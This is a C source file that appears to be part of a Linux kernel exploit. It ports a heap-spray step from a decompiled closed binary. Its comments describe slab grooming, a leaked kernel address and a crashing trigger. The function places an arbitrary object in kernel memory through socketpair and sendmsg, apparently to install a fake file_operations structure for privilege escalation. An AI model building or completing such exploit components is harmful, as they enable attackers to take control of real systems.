/* source: FUN_00106288's delivery sendmsg (see fops_spray.h). Straight
 * port of the socketpair+sendmsg call itself; the surrounding fork-many
 * pre-allocation/free grooming FUN_00106288 does before this call is
 * infrastructure this project's own src/util.c:prepare_kernel_page()
 * already implements and has proven reliable this session (every single
 * test run this session logged "sk_buff reclaim sends=16/16" and
 * "mm leaked=..." succeeding -- the crash has never once been in this
 * grooming step, always downstream in the trigger). Not reusing that
 * proven grooming code would mean re-deriving, from raw assembly, a
 * generic slab-grooming technique the closed binary implements no more
 * correctly than our own already does -- pure risk, no benefit. */
#include <errno.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#include "fops_spray.h"

int spray_fops_install_object(const unsigned char *object,
                               size_t object_len) {
  int fds[2];
  if (socketpair(AF_UNIX, SOCK_STREAM, 0, fds) != 0) {
    return 0;
  }

  struct iovec iov = {
    .iov_base = (void *)object,
    .iov_len = object_len,
  };
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  ssize_t sent = sendmsg(fds[0], &msg, 0);
  int ok = sent == (ssize_t)object_len;

  close(fds[0]);
  close(fds[1]);
  return ok;
}
